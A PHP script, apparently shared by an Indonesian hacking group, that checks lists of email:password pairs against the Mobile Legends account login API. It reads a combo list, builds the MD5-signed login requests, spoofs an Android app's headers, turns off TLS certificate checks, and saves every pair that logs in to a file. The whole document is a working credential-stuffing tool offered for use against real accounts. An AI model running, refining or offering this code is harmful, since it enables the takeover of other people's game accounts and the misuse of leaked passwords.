<?php
/*
Title : Moonton / ML Akun Login Checker
Version : Simple Mode
Source Status : Free
Di Buat : 08-05-2020
Pembuat : k3c0t
Team : .. ::[ PBM ] :: .. <-> IDBTE4M


*/






function auth($api_end_point_url, $header, $post) {
 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_end_point_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
	//curl_setopt($ch, CURLOPT_POST, count($postfields));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);  
    curl_close($ch);
    return $result;
 
}


$green = "\e[92m";
$red = "\e[91m";
$biru = "\e[34m";
echo "\nEnter Your List : ";
$url      = trim(fgets(STDIN));
$kontorus = file_get_contents($url);
$urls     = explode("\n", $kontorus);

foreach ($urls as $list) {
	$urll  = trim($list);
    $potong = explode(":", $urll);
    $user = $potong[0];
    $pass = $potong[1];

    $paswd = md5($pass);
    $sign = "account=".$potong[0]."&md5pwd=".$paswd."&op=login";
    $sign5 = md5($sign);




	$api_end_point_url = "https://accountmtapi.mobilelegends.com/";
	$data = array(
  "op" => "login",
  "sign" => $sign5,
  "params" => array(
    "account" => $potong[0],
    "md5pwd" => $paswd,
 ) , 
  "lang" => "id",);


$post = json_encode($data);

$header=array(
"Host: accountmtapi.mobilelegends.com", 
//"content-length: 155
"origin: https://mtacc.mobilelegends.com", 
"user-agent: Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36", 
"content-type: application/json", 
"accept: */*", 
"x-requested-with: com.mobile.legends", 
"sec-fetch-site: same-site", 
"sec-fetch-mode: cors", 
"sec-fetch-dest: empty", 
"referer: https://mtacc.mobilelegends.com/v2.1/inapp/login", 
"accept-encoding:
", 
"accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", 


);


$result = auth($api_end_point_url, $header, $post);
///echo $result;
$datas = json_decode($result);
$a = $datas->message;
$b = $datas->info;
$c = $datas->data->guid;

if(preg_match("/guid/", $result)) {
             echo $red . "#################\n\033[0m";
echo $biru . "Email : ".$green."$potong[0] \n\033[0m";
echo $biru . "Pass Md5: ".$green."$paswd \n\033[0m";
echo $biru . "Pass : ".$green."$pass\n\033[0m";
echo $biru . "Status Message : ".$green."$a\n\033[0m";
echo $biru . "Status Info: ".$green."$b GUID : ($c)\n\033[0m";
         $file = fopen("sukses.txt","a+");
         fwrite($file,$potong[0].":".$pass."\n");
         fclose($file);
      } else {
      	echo $red . "#################\n\033[0m";
echo $biru . "Status Message : ".$green."$a\n\033[0m";
echo $biru . "Status Info: ".$green."$b GUID : ($c)\n\033[0m";
}

}


?>